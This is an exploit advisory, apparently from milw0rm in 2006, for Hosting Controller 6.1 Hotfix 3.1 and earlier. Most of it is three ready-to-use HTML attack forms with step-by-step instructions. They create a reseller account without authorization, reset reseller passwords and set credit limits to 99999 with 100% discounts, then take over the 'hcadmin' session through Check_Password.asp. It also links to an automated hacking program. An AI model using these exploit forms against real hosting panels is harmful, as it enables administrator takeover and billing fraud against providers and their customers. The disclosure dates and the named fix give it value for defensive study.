<html><head><title>Hosting Controller <= 6.1 Hotfix 3.1 Privilege Escalation Vulnerability</title></head><pre>Title: An attacker can gain reseller privileges and after that can gain admin privileges
Version: 6.1 Hotfix &lt;= 3.1
Developer url: www.Hostingcontroller.com
Solution: Update to Hotfix 3.2
Discover date: 2005,Summer
Report date (to hc company): Sat Jun 10, 2006
Publish date (in security forums): Thu July 06, 2006

-------------------------------------------------------------------------------------
===============================================
1- This code give resadmin session to a user:
Bug in &quot;hosting/addreseller.asp&quot;, No checker is available.
---------------------------------------------------

&lt;script&gt;
function siteaction(){
n_act= &quot;/hosting/addreseller.asp?htype=3&quot;
window.document.all.frm1.action = window.document.all.siteact.value + n_act
window.document.all.frm1.submit()
}
&lt;/script&gt;
&lt;hr&gt;&lt;br&gt;
Form1&lt;br&gt;
URL: &lt;input type=&quot;text&quot; name=siteact size=70&gt;
&lt;br&gt;
&lt;form name=&quot;frm1&quot; method=&quot;post&quot; onsubmit=&quot;return siteaction()&quot;&gt;
&lt;table&gt;
&lt;tr&gt;
&lt;td&gt;reseller&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;reseller&quot; value=&quot;hcadmin&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;loginname&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;loginname&quot; value=&quot;hcadmin&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Password&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;Password&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;first_name&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;first_name&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;last_name&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;address&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;address&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;city&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;city&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;state&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;country&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;country&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;email&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;phone&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;phone&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;fax&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;fax&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;zip&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;zip&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;selMonth&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;selMonth&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;selYear&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;selYear&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;txtcardno&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;txtcardno&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br&gt;&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
---------------------------------------------------
===============================================
2- This code list all of resellers then you must change a password of one of them then login by it for next step.
Note: Also by this code, everyone can increase its Credit value then buy every host.
---------------------------------------------------
&lt;form action=&quot;http://[URL]/Admin/Accounts/AccountActions.asp?ActionType=UpdateCreditLimit&quot; method=&quot;post&quot;&gt;
&lt;table&gt;
&lt;tr&gt;
&lt;td&gt;Username:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;UserName&quot; value=&quot;hcadmin&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Description:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;Description&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FullName:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;FullName&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AccountDisabled 1,[blank]:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;AccountDisabled&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;UserChangePassword:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;UserChangePassword&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PassCheck=TRUE,0:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;PassCheck&quot; value=&quot;0&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;New Password:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;Pass1&quot; value=&quot;&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DefaultDiscount%:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;DefaultDiscount&quot; value=&quot;100&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CreditLimit:&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;CreditLimit&quot; value=&quot;99999&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br&gt;&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;hr&gt;&lt;br&gt;
---------------------------------------------------
===============================================
3- Now you must login by a resseler that changed password from last step. now goto userlist, if there is a user that will enough and if no user available, u must make it!
now select it and click Enter to enter by that user. now the bug will be available:
each reseller can gain every user session even &quot;HCADMIN&quot; by bug in &quot;Check_Password.asp&quot;
below code will help you:
---------------------------------------------------
&lt;hr&gt;&lt;br&gt;
Form1&lt;br&gt;
&lt;form action=&quot;http://[URL]/Admin/Check_Password.asp&quot; method=&quot;post&quot;&gt;
&lt;table&gt;
&lt;tr&gt;
&lt;td&gt;AdName&lt;/td&gt;
&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;AdName&quot; value=&quot;hcadmin&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br&gt;&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;hr&gt;&lt;br&gt;
---------------------------------------------------
===============================================

-------------------------------------------------------------------------------------

Finder: Soroush Dalili (http://www.google.com/search?hl=en&amp;q=&quot;soroush+dalili&quot;)
Email: Irsdl[47]Yahoo[d07]com
Team: GSG (Grayhatz Security Group) [Grayhatz.net]
Thanks from: 
	Farhad Saaedi (farhadjokers[4t]yahoo[d0t]com)
	Small.Mouse from Shabgard.org  (small.mouse[4t]yahoo[d0t]com)
	Kahkeshan Co. (IT Department) (www.kahkeshan.com)
Related URLs:
	http://hidesys.persiangig.com/other/HC_BUGS_BEFORE3.2.txt (all hc bugs by Irsdl)
	http://hidesys.persiangig.com/other/HC%20Hack%20Prog.rar [password: grayhatz.net] (HC automation hacking program source code by simple VB)

# milw0rm.com [2006-07-06]</pre></html>